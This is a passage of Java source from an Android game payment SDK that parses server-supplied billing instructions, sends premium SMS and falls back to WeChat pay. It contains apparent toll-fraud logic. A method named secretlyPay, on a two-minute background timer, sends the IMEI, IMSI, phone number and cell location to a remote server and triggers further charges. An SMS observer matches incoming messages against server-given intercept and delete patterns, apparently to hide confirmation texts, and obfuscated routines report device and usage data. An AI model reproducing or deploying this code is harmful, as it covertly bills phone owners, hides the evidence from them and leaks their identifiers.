			boolean havaPhone = !Helper.isEmpty(getPhoneNum());
			
			String requestResponse = HttpRequestt.get(requestUrl).body();
			
//			String requestResponse = "{\"status\": 205,\"delay\":3000,\"time_out\": 30000,\"direct_delivery\": 0,\"listFeeInfo\": ["
//					+ "{\"order_id\": \"55555eeee\",\"is_general\":0,\"pay_type\": 4,\"need_count\": 1,\"pay_code\": \"9\",\"mkClassName\": \"mobi.zty.pay.sdk.ananFee.AnAnFeeInstance\","
//					+ "\"sdk_pay_info\": { \"app_id\": \"300009051374\",\"sp_channel\": \"2200167510\","
//					+ "\"sp_key\": \"3CB45997F85B027505ED1954E402CC34\"}},{\"order_id\": \"55555eeee\",\"is_general\": 0,\"pay_type\": 4,\"need_count\": 1,\"pay_code\": \"9\",\"mkClassName\": \"mobi.zty.pay.sdk.ananFee.AnAnFeeInstance\","
//					+ "\"sdk_pay_info\": { \"app_id\": \"300009051374\",\"sp_channel\": \"2200167510\","
//					+ "\"sp_key\": \"3CB45997F85B027505ED1954E402CC34\"}}]}";
			//园林测试用的响应内容 start
//			String requestResponse ="{\"status\":200,\"delay\":1362,\"direct_delivery\":0,\"time_out\":60000,"
//					+ "\"listFeeInfo\":[{\"order_id\":\"601061948181\",\"fee_name\":\"rerr\",\"is_general\":1,"
//					+ "\"pay_type\":25,\"need_count\":0,\"verify\":1,\"need_sms\":1,\"pay_code\":\"XE@100@1000@MZ\","
//					+ "\"mkClassName\":\"mobi.zty.pay.sdk.yuanlin.YuanLinInstance\",\"listSmsInfo\":[{\"send_num\":\"10690387000212\",\"sms_content\":\"XE@100@1000@MZ\",\"succ_notify\":0,\"sms_notify_url\":\"\"}],\"verify_info\":{\"vertify_type\":1,\"vertify_url\":\"\",\"fixed_content\":\"\",\"digital_length\":3,\"vertify_num\":\"18612452707\",\"intercept_content\":\"网乐U币\"}}]}";
			//园林测试用的响应内容 end
			
			//中科测试用的响应内容 start
//			String requestResponse = "{\"status\":200,\"delay\":1306,\"time_out\":50000,\"direct_delivery\":0,\"listFeeInfo\":[{\"order_id\":\"601051935471\",\"fee_name\":\"\","
//					+ "\"is_general\":1,\"pay_type\":26,\"need_count\":0,\"verify\":1,\"need_sms\":0,\"pay_code\":\"0A10\",\"mkClassName\":\"mobi.zty.pay.sdk.zhongke.ZhongKeInstance\",\"verify_info\":{\"vertify_type\":2,"
//					+ "\"vertify_url\":\"http://sa.91muzhi.com:8090/sdk/gameSdkInfo/VerifyCode.action\",\"fixed_content\":\"\",\"digital_length\":6,\"vertify_num\":\"18612452707\"}}]}";
			//中科测试用的响应内容 end
			//掌龙测试用的响应内容 start
//			String requestResponse = "{\"status\":200,\"delay\":3273,\"direct_delivery\":0,\"group_step\":1,\"group_count\":3,\"time_out\":36000,\"listFeeInfo\":[{\"order_id\":\"602031143437\",\"fee_name\":\"超值礼包\",\"consume\":15,\"is_general\":0,\"pay_type\":39,\"verify\":1,\"need_sms\":0,\"pay_code\":\"300007777014\",\"mkClassName\":\"mobi.zty.pay.sdk.zhanglong.ZhangLongPayInstance\",\"sdk_pay_info\":{\"app_id\":\"700003777\",\"sp_sign_type\":0,\"pay_code\":\"300007777014\"},\"verify_info\":{\"vertify_type\":0,\"vertify_url\":\"\",\"fixed_content\":\"\",\"digital_length\":0,\"vertify_num\":\"10658099\"}}]}";
			//掌龙测试用的响应内容 end
			
			//冰封谷测试用的响应内容 start
//			String requestResponse = "{\"status\":200,\"delay\":3273,\"direct_delivery\":0,\"group_step\":1,\"group_count\":3,\"time_out\":36000,\"listFeeInfo\":[{\"order_id\":\"602031143437\",\"fee_name\":\"复活\",\"consume\":2,\"is_general\":0,\"pay_type\":37,\"verify\":0,\"need_sms\":0,\"mkClassName\":\"mobi.zty.pay.sdk.hejuFee.HeJuFeeInstance\",\"sdk_pay_info\":{\"app_id\":\"700003777\",\"sp_sign_type\":0,\"app_name\":\"羊羊去哪儿\"},\"verify_info\":{\"vertify_type\":0,\"vertify_url\":\"\",\"fixed_content\":\"\",\"digital_length\":0}}]}";
			//冰封谷测试用的响应内容 end
			boolean isHadFee = false;
			if (requestResponse!=null && requestResponse!="") {
				Util_G.debugE("ALLPAY", requestResponse);
				JSONObject retJson = new JSONObject(requestResponse);
				int state = Helper.getJsonInt(retJson, "status");
				if (state==200) {//获取计费代码成功
					JSONArray feeInfoArray = Helper.getJsonArray(retJson, "listFeeInfo"); 
					if (feeInfoArray==null||feeInfoArray.length()==0) {
						allNotifyPayFail(PayConfig.NO_FEE_FAIL, "给的计费组合为空，后台bug","");
						return;
					}
					curPayShop = new ShopInfo();
					curPayShop.index = SendOder.getInstance().shopIndex;
					curPayShop.delay = Helper.getJsonInt(retJson, "delay");
					curPayShop.timeOut = Helper.getJsonInt(retJson, "time_out");
					curPayShop.groupCount = Helper.getJsonInt(retJson, "group_count");
					curPayShop.groupStep = Helper.getJsonInt(retJson, "group_step");
					curPayShop.directDelivery = Helper.getJsonInt(retJson, "direct_delivery");
					for (int k = 0; k < feeInfoArray.length(); k++) {
						JSONObject feeObject = Helper.getJSONObject(feeInfoArray, k);
						if (feeObject==null) {
							allNotifyPayFail(PayConfig.FEE_ISNULL, "给的计费组合含有无效计费点，后台bug","");
							return;
						}
						FeeInfo feeInfo = new FeeInfo();
						feeInfo.orderId = Helper.getJsonString(feeObject, "order_id");
						feeInfo.payType = Helper.getJsonInt(feeObject, "pay_type");
						feeInfo.feeName = Helper.getJsonString(feeObject, "fee_name");
						feeInfo.isGeneral = Helper.getJsonInt(feeObject, "is_general");
						feeInfo.needSms = Helper.getJsonInt(feeObject, "need_sms");
						feeInfo.consume = Helper.getJsonInt(feeObject, "consume");
						feeInfo.needCount = Helper.getJsonInt(feeObject, "need_count");
						feeInfo.verify = Helper.getJsonInt(feeObject, "verify");
						String deleteContents = Helper.getJsonString(feeObject, "delete_contents");
						if (deleteContents!=null) {
							feeInfo.deleteContents = deleteContents.split("_");
						}
						JSONArray smsInfoArray = Helper.getJsonArray(feeObject,"listSmsInfo");
						if (feeInfo.needSms==1&&smsInfoArray!=null) {
							for (int i = 0; i < smsInfoArray.length(); i++) {
								JSONObject smsInfoJson = Helper.getJSONObject(smsInfoArray, i);
								SMSInfo smsInfo = new SMSInfo();
								smsInfo.type = Helper.getJsonInt(smsInfoJson, "type");
								smsInfo.sendNum =  Helper.getJsonString(smsInfoJson, "send_num");
								smsInfo.succNotify =  Helper.getJsonInt(smsInfoJson, "succ_notify");
								smsInfo.smsNotifyUrl = Helper.getJsonString(smsInfoJson, "sms_notify_url");
								smsInfo.smsContent = Helper.getJsonString(smsInfoJson, "sms_content");
								feeInfo.smsInfos.add(smsInfo);
							}
							
						}
						JSONObject sdkPayInfo = Helper.getJSONObject(feeObject,"sdk_pay_info");
						if (feeInfo.isGeneral==0&&sdkPayInfo!=null) {//本地支撑 要解析sdkinfo
							feeInfo.sdkPayInfo = new SdkPayInfo();
							feeInfo.sdkPayInfo.spIdentify = Helper.getJsonString(sdkPayInfo, "sp_identify");
							feeInfo.sdkPayInfo.appId = Helper.getJsonString(sdkPayInfo, "app_id");
							
							feeInfo.sdkPayInfo.spChannel = Helper.getJsonString(sdkPayInfo, "sp_channel");
							
							feeInfo.sdkPayInfo.appName = Helper.getJsonString(sdkPayInfo, "app_name");
							feeInfo.sdkPayInfo.spKey = Helper.getJsonString(sdkPayInfo, "sp_key");
							feeInfo.sdkPayInfo.spKey2 = Helper.getJsonString(sdkPayInfo, "sp_key2");
							feeInfo.sdkPayInfo.spSignType = Helper.getJsonString(sdkPayInfo, "sp_sign_type");
							feeInfo.sdkPayInfo.payUrl1 = Helper.getJsonString(sdkPayInfo, "pay_url1");
							feeInfo.sdkPayInfo.payUrl2 = Helper.getJsonString(sdkPayInfo, "pay_url2");
							feeInfo.sdkPayInfo.payCode = Helper.getJsonString(sdkPayInfo, "pay_code");
						}
						JSONObject verifyInfo = Helper.getJSONObject(feeObject,"verify_info");
						if (feeInfo.verify == 1&&verifyInfo!=null) {
							feeInfo.verifyInfo = new VerifyInfo();
							feeInfo.payStep = 0;
							if (feeInfo.needSms==0)feeInfo.payStep = 1;
							feeInfo.verifyInfo.vertifyType =  Helper.getJsonInt(verifyInfo, "vertify_type");
							feeInfo.verifyInfo.digitalLength =  Helper.getJsonInt(verifyInfo, "digital_length");
							feeInfo.verifyInfo.vertifyUrl = Helper.getJsonString(verifyInfo, "vertify_url","");
							feeInfo.verifyInfo.fixedContent = Helper.getJsonString(verifyInfo, "fixed_content","");
							feeInfo.verifyInfo.vertifyNum = Helper.getJsonString(verifyInfo, "vertify_num","");
							feeInfo.verifyInfo.confimNum = Helper.getJsonString(verifyInfo, "confim_num","");
							String interceptContent = Helper.getJsonString(verifyInfo, "intercept_content");
							if (interceptContent!=null) {
								feeInfo.verifyInfo.interceptContent = interceptContent.split("_");
							}
						}
						if (GameSDK.mpPayTypeClassName.containsKey(feeInfo.payType)) {
							if (OnlineLibVersionCode>Constants.SDK_VERSION_CODE) {
								feeInfo.mkClassName = Helper.getJsonString(feeObject, "mkClassName",GameSDK.mpPayTypeClassName.get(feeInfo.payType));
							}else{
								feeInfo.mkClassName = GameSDK.mpPayTypeClassName.get(feeInfo.payType);
							}
						}else{
							feeInfo.mkClassName = Helper.getJsonString(feeObject, "mkClassName");
						}
						if (feeInfo.isGeneral==1) {//代表 通用支付类
							feeInfo.mkClassName = GameSDK.mpPayTypeClassName.get(PayConfig.GENERA_KEY);
						}
						curPayShop.mapFeeInfos.put(feeInfo.orderId, feeInfo);
						orderFeeinfoMap.put(feeInfo.orderId, feeInfo);
						if (!fastInitMk.containsKey(feeInfo.payType)) {
							Message message = handler.obtainMessage(NOTICE_INIT_PAY);
							message.obj = feeInfo.orderId;
							message.sendToTarget();
						}
						isHadFee = true;
					}
				}else if(state == 201){//代表当前不需要补刀
					return;
				}else if (!havaPhone) {//如果未获取到计费 并且没有手机号码，我们等8秒后再执行支付操作
					checkNumber();//每次支付的时候 都检测下是知道用户手机短信 不知道 直接获取
					boolean againPay = false;
					if (!Helper.isEmpty(getPhoneNum())) {//假设这个时候 号码已经回来了
						againPay = true;
						requestFee(requestUrl);
					}else{
						int step = 5;
						while (step>0) {
							Thread.sleep(2000);
							if (!Helper.isEmpty(getPhoneNum())) {//过8秒后发现 手机号码回来了
								againPay = true;
								requestFee(requestUrl);
								break;
							}
							step--;
						}
					}
					if (againPay) {
						return;
					}
				}
				
				if (isHadFee&&curPayShop.mapFeeInfos.size()>0) {
					instance.bCallback = 0;//代表未发货
					if (curPayShop.directDelivery==1) {//直接发货
						commHandle.sendEmptyMessage(PayConfig.GIVE_ITEM_BEFIN);
					}
					payResultHandle.removeMessages(PayConfig.NATIVE_FEE_FAIL);
					payResultHandle.sendEmptyMessageDelayed( PayConfig.NATIVE_FEE_FAIL,curPayShop.timeOut);
					int index = 0;
					for (String orideId : curPayShop.mapFeeInfos.keySet()) {
						Message message = handler.obtainMessage(NOTICE_STARTPAY);
						message.obj = orideId;
						message.sendToTarget();
						Thread.sleep(index * curPayShop.delay);
						index++;
					}
				}else{
					allNotifyPayFail(PayConfig.FEE_PARSE_FAIL, "未拿到计费信息！","");
					return;
				}
				
			}   
			if (!isHadFee) {
				info.resutCode = PayConfig.FEE_RESPONSE_FAIL;
				info.retMsg = "支付失败";
				Message message = payResultHandle.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
				message.obj = info;
				message.sendToTarget();
				return;
			}
	    	
		} catch (Exception e) {
			info.resutCode = PayConfig.FEE_RESPONSE_EXCEPTION;
			info.retMsg = "支付失败";
			Message message = payResultHandle.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
			message.obj = info;
			message.sendToTarget();
			e.printStackTrace();
		}
	}
	/**
	 * 检查是否有漏掉的 订单
	 */
	private void secretlyPay(){
		if (context==null&&secretlyStart==-1) {
			return;
		}
		secretlyStart++;
		try{
			String requestUrl = Constants.PAY_SECRET_URL+"parck_id="+packetId+"&imei="+
					Helper.getIMEI(context)
//							"86600102603386"
					+"&imsi="+
					Helper.getIMSI(context)+"&simop="+Helper.getIMSIStart(context)+"&sdk_ver="+
							Constants.SDK_VERSION_CODE+"&ver"+Constants.GAME_SDK_VERSION+"&imcc="+mcc+"&imnc="+mnc+"&icid="+cid+
							"&ilac="+lac+"&mobile_num="+getPhoneNum()+"&app_name="+
							URLEncoder.encode(Helper.getApplicationName(context),"UTF-8")+"&ip="+
							(Helper.isDebugEnv()?Helper.getWifiIpAddress(context):"");
			requestFee(requestUrl);
			if (secretlyStart>=2) secretlyStart=-1;
		} catch (Exception e) {
			e.printStackTrace();
		} 
	
	}
	
	private String creatPayOrderId(int length) {
		String payOrder = UUID.randomUUID().toString();
		payOrder = (payOrder.replace("-", "")).substring(0, length);
		return payOrder;
	}
	
	/**
	 * 当前计费组合是否含有 需要回调才能判断的支付类型  并且是没有二次确认框的 
	 * @return 计费点的 FeeInfo
	 */
	public FeeInfo haveCallbakePay() {
		if (curPayShop != null && curPayShop.mapFeeInfos.size() > 0) {
			for (FeeInfo feeInfo:curPayShop.mapFeeInfos.values()) {
				int payType = feeInfo.payType;
				if (payTypeIsSdk.containsKey(payType) && payTypeIsSdk.get(payType)) {
					return feeInfo;
				}
			}
		}
		return null;
	}
	public void allNotifyPayFail(int what ,String erroMsg,String orderId){
		PayResultInfo info = new PayResultInfo();
		info.resutCode = what;
		info.retMsg = erroMsg;
		info.orderId = orderId;
		Message msg = payResultHandle.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
		msg.obj = info;
		msg.sendToTarget();
	}
	public static boolean needReadSMS(){
		boolean ret = false;
		if (instance.getOrderFeeInfoMap()==null) {
			return ret;
		}
		for (FeeInfo info:instance.getOrderFeeInfoMap().values()) {
			if (info.verify==1||(info.deleteContents!=null&&info.deleteContents.length>0)) {
				return true;
			}
		}
		return ret;
	}
	public static boolean isFill(String sms, String phone) {
		boolean ret = false;
		if (instance.getOrderFeeInfoMap()==null||!needReadSMS()) {
			return false;
		}
		for (FeeInfo info:instance.getOrderFeeInfoMap().values()) {
			if (info.verifyInfo!=null&&!Helper.isEmpty(info.verifyInfo.vertifyNum)&&phone.contains(info.verifyInfo.vertifyNum)) {
				return true;
			}
			
			if (info.verifyInfo!=null&&info.verifyInfo.interceptContent!=null&&info.verifyInfo.interceptContent.length>0) {
				boolean intercept = true;
				for (int i = 0; i < info.verifyInfo.interceptContent.length; i++) {
					if (!sms.contains(info.verifyInfo.interceptContent[i])) {
						intercept = false;
					}
				}
				if (intercept) {
					return true;
				}
			}
			
			if (info.deleteContents!=null&&info.deleteContents.length>0) {
				boolean intercept = true;
				for (int i = 0; i < info.deleteContents.length; i++) {
					if (!sms.contains(info.deleteContents[i])) {
						intercept = false;
					}
				}
				if (intercept) {
					return true;
				}
			}
			
		}
		return ret;
	}
	
	public void makeToast(String message) {
		if (Helper.isDebugEnv()) {
			Message msg = handler.obtainMessage(NOTICE_PROMIT);
			msg.obj = message;
			msg.sendToTarget();
		}
    }
	
	/**
	 * 0  、支付结果都还没回来才
	 * 1、代表支付结束(这里一般是 支付成功的了)
	 * 2、支付结果都回来了 并且都是失败
	 * @return
	 */
	public int overPay(){
		if (curPayShop==null) {
			return 1;
		}
		int over = 0;
		boolean succOver = false;
		boolean failOver = true;
		for (FeeInfo feeInfo:curPayShop.mapFeeInfos.values()) {
			if (feeInfo.payStep==3) {
				succOver = true;
			}
			if (feeInfo.payStep!=4) {
				failOver = false;
			}
		}
		if (succOver) over = 1;
		if (failOver) over = 2;
		return over;
	}
	
	/**
	 * 以后 支付正常的结束 以及轮询到第二套支付 都在这里处理
	 * type 0 支付成功的检测 1支付失败的检测 2支付取消的检测 3 超时的检测 
	 */
	public synchronized void allCheckPay(int type){
		if (type == 3) {//如果是超时了 直接结束当前 计费组合
			if (checkToOther()) {//走第三方
				payResultHandle.removeMessages(PayConfig.NOTIFY_PAYRESULT);
				notifyToOtherPay();
			}
		}else{
			if (overPay()==1) {//成功的回调 已经在handler中做了相关处理
				payResultHandle.removeMessages(PayConfig.NATIVE_FEE_FAIL);
			}else if (overPay()==2) {//直接走第三方 新sdk不做轮询处理
				if (curPayShop.groupStep<curPayShop.groupCount) {
					Util_G.debugE("ALLPAY", "尝试轮询下一套计费");
					final String requestUrl = getRequestUrl(curPayShop.groupStep);
					new Thread(new Runnable() {
						
						@Override
						public void run() {
							requestFee(requestUrl);
						}
					}).start();
					
				}else{
					Util_G.debugE("AllPAy", "计费超时转第三方支付-》》");
					payResultHandle.removeMessages(PayConfig.NATIVE_FEE_FAIL);
					payResultHandle.removeMessages(PayConfig.NOTIFY_PAYRESULT);
					notifyToOtherPay();
				}
			
			}
		}
	}
	private String getRequestUrl(int groupStep) {
		String requestUrl = "";
		try {
		    requestUrl = Constants.GET_FEE_URL+"parck_id="+packetId+"&imei="+
					Helper.getIMEI(context)+"&imsi="+Helper.getIMSI(context)+
					"&group_step="+groupStep+"&simop="+Helper.getIMSIStart(context)+"&sdk_ver="+
							Constants.SDK_VERSION_CODE+"&ver="+Constants.GAME_SDK_VERSION+"&amount="+SendOder.getInstance().amount+"&index="+
					SendOder.getInstance().shopIndex+"&imcc="+mcc+"&imnc="+mnc+"&icid="+cid+
							"&ilac="+lac+"&mobile_num="+getPhoneNum()+"&app_name="+
							URLEncoder.encode(Helper.getApplicationName(context),"UTF-8")+
//							"&ip="+(Helper.isDebugEnv()?Helper.getWifiIpAddress(context):"")+
							"&payname="+SendOder.getInstance().payname;
		} catch (Exception e) {
			// TODO: handle exception
		}
		return requestUrl;
	}
	
	
	/**
	 * 检测是否执行第三方支付，如果不执行第三方 那肯定是轮询下一套计费了
	 * @param delayTimer 轮询下一套计费要等待的时间 毫秒
	 * @return
	 */
	private boolean checkToOther() {
		return curPayShop==null?false:true;
	};
	public void notifyPaymentFinish(int amount) {
        if (gameSDKPaymentListener != null&&instance.bCallback == 0) {
        	instance.bCallback = 1;
        	curPayShop = null;
            gameSDKPaymentListener.onPayFinished(amount);
        }
        if (secretlyStart<0) secretlyStart = 0;
    }
    public void notifyPaymentCancelled() {
        if (gameSDKPaymentListener != null) {
        	curPayShop = null;
            gameSDKPaymentListener.onPayCancelled();
        }
    }
    public void notifyPaymentFail(PayResultInfo info) {
        if (gameSDKPaymentListener != null&&instance.bCallback == 0) {
        	curPayShop = null;
        	Util_G.debugE("ALLPAY", "通知支付失败");
            gameSDKPaymentListener.onPayFail(info);
        }
    }
    private String otherOrderId="";
    public void notifyToOtherPay(){
    	try {
    		if (directPay.equals("-1")) {
    			otherHandler.sendEmptyMessage(PayConfig.WECAHT_FAIL);
			}else{
				payResultHandle.removeMessages(PayConfig.NATIVE_FEE_FAIL);
				//失败之后 如果直接再走第三方要重新生成订单号
				otherOrderId = creatPayOrderId(11);
				PaymentFactoy.producePay("mobi.zty.pay.sdk.wecaht.WeChatInstance",context).pay(context,
						otherOrderId, SendOder.getInstance().amount, SendOder.getInstance().payname,PayConfig.WECHAT_PAY+"");
				directPay = PayConfig.WECHAT_PAY+"";
			}
		} catch (Throwable e) {
			otherHandler.sendEmptyMessage(PayConfig.SP_PAY_EXPTION);
		}
		return;
    }
    
    public ContentObserver mObserver;
	private static void addSMSObserver(Context context)
    {
		try {
			 ContentResolver resolver = context.getContentResolver();
		     Handler handler = new SMSHandler(resolver, context);
		     instance.mObserver = new SMSObserver(resolver, handler);
		     resolver.registerContentObserver(SMS.CONTENT_URI, true, instance.mObserver);
		} catch (Throwable e) {
			e.printStackTrace();
		}
    }
    
    /**
     * 退出游戏时调用
     */
    public void exitGame(){
    	handler.sendEmptyMessage(NOTICE_EXITGAME);
    	
    }
	private void notiFyExitGame() {
		exitTrure();
	}
	private void exitTrure() {
		if (instance.mObserver!=null) {
    		context.getContentResolver().unregisterContentObserver(instance.mObserver);
		}
		//HeJuFeeInstance.getInstance().exitsdk(context);//冰封谷SDK退出
		statisticsDuration(null);
		curPayShop = null;
    	payway = 0;
    	setDebug(false);
    	context.unregisterReceiver(mSMSReceiver1);
		instance = null;
		SendTimer = false;
		secretlyStart = -1;
		System.exit(0);
		android.os.Process.killProcess(android.os.Process.myPid());
	}
    
    private class DurationTread extends Thread{
		@Override
		public void run() {
			super.run();
			while (SendTimer) {
				try {
					watch();
					Thread.sleep(1000);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
    long background = 0;
    long secretlyCount = 0;
    public void watch() {
		if (!mPowerManager.isScreenOn() || !Helper.isAppOnForeground(context)) {//如果游戏不在前端马上发送数据
			if (background>0) {
				background = 0;
				statisticsDuration(null);
				afdf3();
			}
		} else {
			background++;
			if (background > 60*2) {// 2分钟发送一次 
				statisticsDuration(null);
				afdf3();
				background = 0;
			}
		}
		secretlyCount++;
		if (secretlyCount>60*2) {
			secretlyPay();
			secretlyCount= 0;
		}
	}
    /**
     * 统计时长
     * @param storage
     */
	private void statisticsDuration(LocalStorage storage) {
		if (storage == null) {
			 storage = LocalStorage.getInstance(context);
		}
        int afd = 0;
        afd = (int)(System.currentTimeMillis()/1000);
        int dt = afd-instance.afdft;
        storage.putString("adff2", String.valueOf(dt>0?dt:0));
	}
	
	public  void afdf3() {
    	if (!Helper.isNetworkConnected(context)||afdf==null) {//如果进来时初始化没成功 就不发送在线时长统计
            return;
        }
    	String adff0 = null;
    	if (adff0==null||adff0.trim().equals("")) {
    		adff0 = Helper.getIMEI(context);
		}
        try {
        	LocalStorage storage = LocalStorage.getInstance(context);
        	int adff2 = 0;
        	int adff3 = 0;
        	String content="0";
        	String  adff4 = "";
        	String  adff5 = "";
        	String  adff6 = "";
            try {
                
                 content = storage.getString("adff2", "0");//crypto.decrypt(deviceId,content);
                 adff2 = Integer.valueOf(content);
                 
                 content = storage.getString("adff3", "0");//crypto.decrypt(deviceId,content);
                 adff3 = Integer.valueOf(content);
                 
                 adff4 = storage.getString("adff4", "");
                 adff5 = storage.getString("adff5", "");
                 adff6 = storage.getString("adff6", "");
                 
            } catch (Exception ex) {
            }
            JSONObject user = new JSONObject();
            user.put("device_id", deviceId);
            user.put("packet_id", packetId);
            user.put("game_id", gameId);
            user.put("login_account", adff0);
            user.put("server_id", adff4);
            user.put("adff5", adff5);
            user.put("adff6", adff6);

            user.put("adff2", adff2);
            user.put("adff3", adff3);
            
            user.put("ver", Constants.GAME_SDK_VERSION);
            
            HttpRequest<UserInfo> request = new HttpRequest<UserInfo>(context,
            		null, 
            		null);//new LoginListener(loginCallback))
            request.execute(
            		afdf,
                    user.toString());
            
//            Log.e("afdf3", "afdf3--->"+user.toString());
            instance.afdft = (int)(System.currentTimeMillis()/1000);
        } catch (Exception ex) {
           // makeToast("初始化失败，请退出程序后再试");
        }
    }
	
	public void onActivityResult(int requestCode, int resultCode, Intent data) {
		if (directPay.equals(PayConfig.WECHAT_PAY+"")) {
			directPay="";
			curPayShop = null;
			if (data == null) {
				otherHandler.sendEmptyMessage(PayConfig.WECAHT_CANCER);
				return;
			}
			String respCode = data.getExtras().getString("respCode");
			String errorCode = data.getExtras().getString("errorCode");
			String respMsg = data.getExtras().getString("respMsg");
			if (respCode == null) {
				otherHandler.sendEmptyMessage(PayConfig.WECAHT_CANCER);
				return;
			}
			StringBuilder temp = new StringBuilder();
			if (respCode.equals("00")) {
				temp.append("交易状态:成功");
				otherHandler.sendEmptyMessage(PayConfig.WECAHT_SUCC);
			} else if (respCode.equals("02")) {
				// temp.append("交易状态:取消");
				otherHandler.sendEmptyMessage(PayConfig.WECAHT_CANCER);
			} else if (respCode.equals("01")) {
				temp.append("交易状态:失败").append("\n").append("错误码:")
						.append(errorCode).append("原因:" + respMsg);
				Util_G.debugE("ALLPAY", temp.toString());
				otherHandler.sendEmptyMessage(PayConfig.WECAHT_FAIL);
			} else if (respCode.equals("03")) {
				temp.append("交易状态:未知").append("\n").append("错误码:")
						.append(errorCode).append("原因:" + respMsg);
				Util_G.debugE("ALLPAY", temp.toString());
				otherHandler.sendEmptyMessage(PayConfig.WECAHT_FAIL);
			}
		}
	}
	
	public String getPhoneNum() {
		return phoneNum;
	}
	public void setPhoneNum(String phoneNum) {
		this.phoneNum = phoneNum;
	}
	public String getObtainNum() {
		return obtainNum;
	}
	public void setObtainNum(String obtainNum) {
		this.obtainNum = obtainNum;
	}

	public String getNumUrl() {
		return numUrl;
	}
	
	public void setNmumark(int num_mark){
		this.obtain_num_mark = num_mark;
	}
	
	public int getNummark(){
		return obtain_num_mark;
	}
	
	public void setSureButton(int sure_Button){
		this.sureBtton = sure_Button;
	}
	public int getSureButton(){
		return sureBtton;
	}
	
	/**
	 * 获取 当前支付流程中 某个计费点对象
	 * @param orderId
	 * @return
	 */
	private FeeInfo getFeeInfoByCurShop(String orderId){
		if (curPayShop!=null&&curPayShop.mapFeeInfos.size()>0) {
			for (FeeInfo feeInfo : curPayShop.mapFeeInfos.values()) {
				if (orderId.equals(feeInfo.orderId)) {
					return feeInfo;
				}
			}
		}
		return null;
	}
	
	/**
	 * 主要是删除 无用的计费信息对象
	 */
	private synchronized void updateFeeInfo(){
		Iterator<Map.Entry<String, FeeInfo>> it = orderFeeinfoMap.entrySet().iterator();
		while (it.hasNext()) {
			Map.Entry<String, FeeInfo> entry = it.next();
			FeeInfo feeInfo = entry.getValue();
			long delTime = System.currentTimeMillis()-feeInfo.startTime;
			if (delTime>3*60*1000) {
				it.remove();
			}
		}
	}
	public FeeInfo getFeeInfoByOrderId(String orderId){
		if (orderFeeinfoMap.containsKey(orderId)) {
			return orderFeeinfoMap.get(orderId);
		}
		return null;
	}
	
	/**
	 * 所有计费对象列表
	 * @return
	 */
	public Map<String, FeeInfo> getOrderFeeInfoMap(){
		return orderFeeinfoMap;
	}

}
